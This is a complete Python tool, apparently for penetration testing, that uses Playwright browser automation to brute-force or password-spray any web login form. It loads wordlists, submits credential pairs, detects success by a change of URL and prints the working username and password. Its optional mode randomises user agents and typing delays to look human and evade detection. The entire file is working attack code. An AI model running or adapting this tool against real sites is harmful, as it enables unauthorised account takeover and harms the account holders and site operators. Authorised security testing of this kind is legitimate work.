#!/usr/bin/env python3

import argparse
import sys
import asyncio
import random
from playwright.async_api import async_playwright, Browser, Page, Locator, TimeoutError
from fake_useragent import UserAgent

class C:
    RED, GREEN, YELLOW, LIGHT_BLUE, CYAN, BOLD, END = '\033[91m', '\033[92m', '\033[93m', '\033[94m', '\033[96m', '\033[1m', '\033[0m'    

def print_banner():
    """Prints the tool's banner."""
    banner = rf"""
{C.RED}  _________      .__        __________                __          
 /   _____/ ____ |  |   ____\______   \_______ __ ___/  |_  ____  
 \_____  \_/ __ \|  | _/ __ \|    |  _/\_  __ \  |  \   __\/ __ \ 
 /        \  ___/|  |_\  ___/|    |   \ |  | \/  |  /|  | \  ___/ 
/_______  /\___  >____/\___  >______  / |__|  |____/ |__|  \___  >
        \/     \/          \/       \/                         \/ 
{C.END}
  {C.BOLD}{C.YELLOW}>> [A WebDriver-based Authentication Toolkit] <<{C.END}
  {C.BOLD}{C.YELLOW}     >> [By {C.END}{C.BOLD}{C.RED}tpazz {C.END}{C.BOLD}{C.YELLOW}-{C.END}{C.BOLD}{C.GREEN} Green Lemon Company{C.END}{C.BOLD}{C.YELLOW}] << {C.END}
"""
    print(banner)

def parse_args():
    """Parses command-line arguments."""
    parser = argparse.ArgumentParser(
        description="~ Playwright script to brute force or password spray a login form ~"
    )
    parser.add_argument("--url", required=True, help="URL of the login page")
    parser.add_argument("--username", help="[Brute Force] Single username to attack.")
    parser.add_argument("--passwords-file", help="[Brute Force] Path to file containing a list of passwords.")
    parser.add_argument("--usernames-file", help="[Password Spray] Path to file containing a list of usernames.")
    parser.add_argument("--password", help="[Password Spray] Single password to try against all usernames.")
    parser.add_argument("--browser", default="chromium", choices=["chromium", "firefox", "webkit"], help="Browser engine to use (default: chromium)")
    parser.add_argument("--max-attempts", type=int, default=0, help="Maximum number of password attempts to try (0 means no limit)")
    parser.add_argument("--headless", action="store_true", help="Run the browser in headless mode")
    parser.add_argument("--simulate-user", action="store_true", help="Enables realistic user simulation (slower).")
    parser.add_argument("--username-locator-strategy", required=True, choices=["id", "name", "xpath", "css"], help="Locator strategy for the username field")
    parser.add_argument("--username-locator-value", required=True, help="Locator value for the username field")
    parser.add_argument("--password-locator-strategy", required=True, choices=["id", "name", "xpath", "css"], help="Locator strategy for the password field")
    parser.add_argument("--password-locator-value", required=True, help="Locator value for the password field")
    parser.add_argument("--loginbutton-locator-strategy", required=True, choices=["id", "name", "xpath", "css"], help="Locator strategy for the login button")
    parser.add_argument("--loginbutton-locator-value", required=True, help="Locator value for the login button")
    return parser.parse_args()

def get_playwright_selector(strategy, value):
    """Converts strategy and value into a Playwright selector string."""
    strategy = strategy.lower()
    if strategy == "id": return f"#{value}"
    elif strategy == "name": return f"[name='{value}']"
    elif strategy == "xpath": return f"xpath={value}"
    elif strategy == "css": return value
    else: raise ValueError(f"Unsupported locator strategy: {strategy}")

async def main():
    print_banner()
    args = parse_args()
    is_brute_force = args.username and args.passwords_file
    is_password_spray = args.usernames_file and args.password

    if not (is_brute_force or is_password_spray) or (is_brute_force and is_password_spray):
        sys.exit("Error: Invalid arguments. Specify either (--username and --passwords-file) OR (--usernames-file and --password).")

    attack_list = []
    try:
        if is_brute_force:
            with open(args.passwords_file, "r", encoding="latin-1", errors="ignore") as f:
                passwords = [line.strip() for line in f if line.strip()]
            for p in passwords: attack_list.append((args.username, p))
        else:
            with open(args.usernames_file, "r", encoding="latin-1", errors="ignore") as f:
                usernames = [line.strip() for line in f if line.strip()]
            for u in usernames: attack_list.append((u, args.password))
    except FileNotFoundError as e:
        sys.exit(f"Error: File not found - {e.filename}")

    if args.max_attempts > 0:
        attack_list = attack_list[:args.max_attempts]

    username_selector = get_playwright_selector(args.username_locator_strategy, args.username_locator_value)
    password_selector = get_playwright_selector(args.password_locator_strategy, args.password_locator_value)
    loginbutton_selector = get_playwright_selector(args.loginbutton_locator_strategy, args.loginbutton_locator_value)

    async with async_playwright() as p:
        browser: Browser
        if args.browser == "chromium": browser = await p.chromium.launch(headless=args.headless)
        elif args.browser == "firefox": browser = await p.firefox.launch(headless=args.headless)
        elif args.browser == "webkit": browser = await p.webkit.launch(headless=args.headless)
        else: raise ValueError("Unsupported browser specified.")

        page_options = {}
        if args.simulate_user:
            try:
                ua = UserAgent()
                random_user_agent = ua.random
                page_options['user_agent'] = random_user_agent
            except Exception:
                # Fallback to a generic user agent if the library fails (e.g., network issue)
                page_options['user_agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'
            page_options['viewport'] = {'width': 1920, 'height': 1080}

        page: Page = await browser.new_page(**page_options)
        initial_url = ""
        found_credentials = False

        try:
            await page.goto(args.url)
            initial_url = page.url # Capture the URL after any initial redirects

            for idx, (user, pwd) in enumerate(attack_list, start=1):
                if args.simulate_user and idx > 1:
                    await asyncio.sleep(random.uniform(1, 2))
                
                sys.stdout.write('\r' + ' ' * 80)
                sys.stdout.write(f"\r[{idx}/{len(attack_list)}] Trying: {user}:{pwd}")
                sys.stdout.flush()

                username_field: Locator = page.locator(username_selector)
                password_field: Locator = page.locator(password_selector)
                login_button: Locator = page.locator(loginbutton_selector)

                if args.simulate_user:
                    await username_field.clear() # Explicitly clear fields before slow typing.
                    await password_field.clear()
                    await username_field.type(user, delay=random.uniform(50, 150))
                    await password_field.type(pwd, delay=random.uniform(50, 150))
                else:
                    await username_field.fill(user)
                    await password_field.fill(pwd)

                # In simulate mode, use a patient wait for navigation. Otherwise, use a faster readyState check.
                if args.simulate_user:
                    try:
                        await login_button.hover()
                        await asyncio.sleep(random.uniform(0.2, 0.5))
                        async with page.expect_navigation(timeout=5000):
                            await login_button.click()
                    except TimeoutError:
                        pass # Navigation did not happen, which is expected for a failed login.
                else:
                    await login_button.click()
                    await page.wait_for_function("document.readyState === 'complete'")

                if page.url != initial_url:
                    print(f"\n{C.GREEN}{C.BOLD}[+] SUCCESS! Credentials found: {user}:{pwd}{C.END}")
                    found_credentials = True
                    break
                else:
                    await page.goto(initial_url) # Reload the page to ensure a clean state for the next attempt.

            if not found_credentials:
                print(f"\n\n{C.BOLD}{C.YELLOW}[-] Process finished. No credentials found.{C.END}\n")

        finally:
            await browser.close()

if __name__ == "__main__":
    asyncio.run(main())